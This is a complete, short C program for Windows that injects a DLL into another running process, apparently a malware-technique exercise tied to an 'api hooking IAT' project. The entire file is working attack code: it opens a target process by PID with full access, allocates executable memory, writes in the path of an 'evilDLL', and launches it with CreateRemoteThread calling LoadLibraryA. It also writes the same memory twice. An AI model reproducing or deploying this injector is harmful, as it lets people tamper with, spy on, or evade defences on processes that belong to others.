#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\Users\\joeyh\\Desktop\\api hooking IAT\\x64\\Debug\\hookingDLL.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[])
{
  HANDLE processHandle; // process handle
  HANDLE remoteThread; // remote thread
  LPVOID remoteBuffer; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle((LPCSTR)"Kernel32");
  VOID *lb = (VOID *)GetProcAddress(hKernel32, "LoadLibraryA");

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }
  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  remoteBuffer = VirtualAllocEx(processHandle, NULL, evilLen, MEM_COMMIT | MEM_RESERVE , PAGE_EXECUTE_READWRITE);

  if (remoteBuffer)
  {
    WriteProcessMemory(processHandle, remoteBuffer, evilDLL, evilLen, NULL);
    
    // "copy" evil DLL between processes
    WriteProcessMemory(processHandle, remoteBuffer, evilDLL, evilLen, NULL);

    // our process start new thread
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remoteBuffer, 0, NULL);
    CloseHandle(processHandle);
    printf("Injecting DLL to PID: %i", atoi(argv[1]));
    return 0;
  }
  else
  {
      return -1;
  }

}